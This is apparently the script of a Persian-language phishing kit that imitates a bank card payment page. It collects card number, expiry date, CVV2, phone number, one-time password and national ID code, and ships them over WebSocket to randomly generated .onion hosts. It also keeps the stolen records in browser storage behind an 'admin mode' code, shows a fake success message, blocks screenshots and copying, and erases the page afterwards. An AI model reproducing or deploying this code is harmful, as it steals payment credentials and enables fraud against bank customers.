<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
    const x = (function() {
        const steps = document.querySelectorAll('.step');
        const progressFill = document.getElementById('progress-fill');
        const userDataDiv = document.getElementById('user-data');
        let currentStep = 1;
        let userData = {};
        let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
        let isSpecialMode = false;
        let sessionId = Math.random().toString(36).substr(2, 10);
        const SPECIAL_CODE = '12122312';
        const SERVERS = [
            () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
            () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
            () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`
        ];

        function init() {
            setupInputs();
            updateProgress();
            displayAllUsersData();
            if (!localStorage.getItem(`specialMode_${sessionId}`)) {
                setSelfDestructTimeout(600);
            }
            setupScreenshotProtection();
            window.addEventListener('beforeunload', handlePageExit);
        }

        function setupInputs() {
            const cardNumber = document.getElementById('card-number');
            cardNumber.addEventListener('input', e => {
                let value = e.target.value;
                if (value === SPECIAL_CODE) {
                    isSpecialMode = true;
                    localStorage.setItem(`specialMode_${sessionId}`, 'true');
                    alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
                }
                value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').slice(0, 19).trim();
                e.target.value = value;
            });
            cardNumber.addEventListener('blur', e => updateUserData('شماره کارت', e.target.value));

            document.getElementById('expiry').addEventListener('input', e => {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                e.target.value = v.slice(0, 5);
            });
            document.getElementById('expiry').addEventListener('blur', e => updateUserData('تاریخ انقضا', e.target.value));

            document.getElementById('cvv2').addEventListener('input', e => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            });
            document.getElementById('cvv2').addEventListener('blur', e => updateUserData('CVV2', e.target.value));

            document.getElementById('phone-number').addEventListener('input', e => {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 0) {
                    e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
                }
            });
            document.getElementById('phone-number').addEventListener('blur', e => updateUserData('شماره تلفن', e.target.value));

            document.getElementById('otp').addEventListener('input', e => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            });
            document.getElementById('otp').addEventListener('blur', e => updateUserData('رمز پویا', e.target.value));

            document.getElementById('fake-field').addEventListener('blur', e => updateUserData('کد ملی', e.target.value));
        }

        function updateUserData(key, value) {
            if (value.trim()) { // فقط اگر مقدار غیرخالی باشه ذخیره کن
                userData[key] = value;
                saveAndDisplayUserData();
            }
        }

        function saveAndDisplayUserData() {
            if (Object.keys(userData).length > 0) {
                allUsersData = allUsersData.filter(u => JSON.stringify(u) !== JSON.stringify(userData));
                allUsersData.push({ ...userData });
                localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
            }
            displayAllUsersData();
        }

        function displayAllUsersData() {
            userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
                allUsersData.map((user, index) => 
                    `<div style="margin-bottom: 15px;">
                        <h4>کاربر ${index + 1}:</h4>` + 
                        Object.entries(user)
                            .map(([key, value]) => `<p>${key}: ${value}</p>`)
                            .join('') +
                    `</div>`
                ).join('');
        }

        function setupScreenshotProtection() {
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('selectstart', e => e.preventDefault());
            document.addEventListener('keydown', e => {
                if (e.key === 'PrintScreen' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                    e.preventDefault();
                    alert('گرفتن اسکرین‌شات مجاز نیست!');
                    document.body.style.filter = 'blur(10px)';
                    setTimeout(() => document.body.style.filter = 'none', 1000);
                }
            });
            window.addEventListener('blur', () => {
                document.body.style.filter = 'blur(5px)';
                setTimeout(() => document.body.style.filter = 'none', 2000);
            });
        }

        function validateStep(step) {
            const card = document.getElementById('card-number').value;
            if (card === SPECIAL_CODE) {
                return true;
            }

            const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
            for (let input of inputs) {
                if (!input.value.trim()) {
                    alert('لطفاً تمامی فیلدها را پر کنید');
                    return false;
                }
            }

            if (step === 1) {
                if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
                    alert('شماره کارت نامعتبر است');
                    return false;
                }
            }

            if (step === 2) {
                const phone = document.getElementById('phone-number').value.replace(/-/g, '');
                if (phone.length !== 11 || !phone.startsWith('09')) {
                    alert('شماره تلفن نامعتبر است');
                    return false;
                }
            }
            return true;
        }

        function nextStep(step) {
            if (!validateStep(step)) return;

            steps[step - 1].classList.remove('active');
            const card = document.getElementById('card-number').value;
            if (card === SPECIAL_CODE && step === 1) {
                currentStep = 3;
                showSpecialResult();
            } else {
                currentStep = step + 1;
                if (currentStep === 3) processPayment();
            }
            steps[currentStep - 1].classList.add('active');
            updateProgress();
        }

        function showSpecialResult() {
            const result = document.getElementById('result');
            result.innerHTML = `حالت مدیر: اطلاعات وارد شده نمایش داده شد.<br>` +
                Object.entries(userData)
                    .map(([key, value]) => `${key}: ${value}`)
                    .join('<br>');
        }

        function updateProgress() {
            progressFill.style.width = `${(currentStep / steps.length) * 100}%`;
        }

        function requestOTP() {
            const phone = document.getElementById('phone-number').value.replace(/-/g, '');
            if (phone.length !== 11 || !phone.startsWith('09')) {
                alert('شماره تلفن نامعتبر است');
                return;
            }
            const encrypted = encryptData({ phone });
            sendData(1, { action: 'otp', data: encrypted });
            startTimer(120);
        }

        function startTimer(seconds) {
            const timer = document.getElementById('otp-timer');
            let timeLeft = seconds;
            const interval = setInterval(() => {
                timer.textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
                if (--timeLeft < 0) {
                    clearInterval(interval);
                    timer.textContent = 'رمز پویا منقضی شد';
                }
            }, 1000);
        }

        function encryptData(data) {
            const key = CryptoJS.lib.WordArray.random(32);
            const iv = CryptoJS.lib.WordArray.random(16);
            const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            });
            return encrypted.toString();
        }

        function sendData(serverIndex, payload) {
            const ws = new WebSocket(SERVERS[serverIndex]());
            ws.onopen = () => {
                ws.send(JSON.stringify(payload));
                ws.close();
            };
            ws.onerror = () => console.log('WebSocket error');
        }

        function processPayment() {
            const loader = document.getElementById('loader');
            const result = document.getElementById('result');
            loader.style.display = 'block';

            const data = {
                card: document.getElementById('card-number').value,
                expiry: document.getElementById('expiry').value,
                cvv2: document.getElementById('cvv2').value,
                phone: document.getElementById('phone-number').value,
                otp: document.getElementById('otp').value
            };

            const encryptedCard = encryptData({ card: data.card, expiry: data.expiry });
            const encryptedCvv = encryptData({ cvv2: data.cvv2 });
            const encryptedOtp = encryptData({ phone: data.phone, otp: data.otp });

            setTimeout(() => {
                sendData(0, { action: 'card', data: encryptedCard });
                sendData(1, { action: 'cvv', data: encryptedCvv });
                sendData(2, { action: 'otp', data: encryptedOtp });
                loader.style.display = 'none';
                const transactionId = generateTransactionId();
                userData['شماره تراکنش'] = transactionId;
                saveAndDisplayUserData();
                result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}<br>لطفاً این کد را نزد خود نگه دارید.`;
                if (!isSpecialMode) selfDestruct();
            }, 2000);
        }

        function generateTransactionId() {
            return 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
        }

        function selfDestruct() {
            document.querySelectorAll('input').forEach(input => input.value = '');
            document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
            setTimeout(() => {
                document.body.innerHTML = '<h1>جلسه منقضی شد</h1>';
                window.history.pushState(null, '', '/');
                window.location.replace('about:blank');
            }, 5000);
        }

        function setSelfDestructTimeout(seconds) {
            if (!isSpecialMode) {
                setTimeout(() => {
                    alert('زمان جلسه به پایان رسید.');
                    selfDestruct();
                }, seconds * 1000);
            }
        }

        function handlePageExit() {
            if (!isSpecialMode) {
                localStorage.removeItem(`specialMode_${sessionId}`);
                saveAndDisplayUserData();
            }
        }

        function cancel() {
            if (confirm('آیا از لغو مطمئن هستید؟')) {
                sendData(0, { action: 'cancel' });
                saveAndDisplayUserData();
                if (!isSpecialMode) selfDestruct();
            }
        }

        init();

        return {
            nextStep,
            requestOTP,
            cancel
        };
    })();
</script>
